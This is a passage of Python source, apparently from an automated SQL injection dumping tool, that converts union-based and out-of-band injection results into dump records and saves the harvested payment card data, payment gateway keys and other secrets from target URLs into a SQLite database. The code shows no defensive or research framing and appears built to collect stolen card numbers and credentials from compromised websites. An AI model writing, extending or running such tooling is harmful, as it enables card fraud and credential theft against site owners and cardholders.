        # Extract data from union result
        if hasattr(union_result, 'data') and union_result.data:
            dump.data = union_result.data
        return dump

    def _oob_to_dump(self, oob_result, url: str):
        """Convert OOB result to minimal DumpedData."""
        from sqli_dumper import DumpedData
        dump = DumpedData(url=url, dbms=oob_result.dbms or "")
        if oob_result.extraction:
            dump.raw_dumps.append(json.dumps(oob_result.extraction))
        return dump

    # ──────────────────────────────────────────────────────────
    # Persistence
    # ──────────────────────────────────────────────────────────

    def _persist(self, parsed: ParsedDumpData, url: str):
        """Save findings to SQLite DB."""
        try:
            for card in parsed.cards:
                self.db.add_card_data(url, card)
            
            for key in parsed.gateway_keys:
                self.db.add_gateway_key(
                    url, key.get("type", "db_key"),
                    key.get("value", ""),
                    source=f"auto_dump_{parsed.source}",
                )
            
            for secret in parsed.secrets:
                self.db.add_secret(
                    url, secret.get("type", ""),
                    secret.get("column", ""),
                    secret.get("value", ""),
                    "auto_dump",
                    0.9,
                )
        except Exception as e:
            logger.debug(f"[AutoDump] Persistence error: {e}")
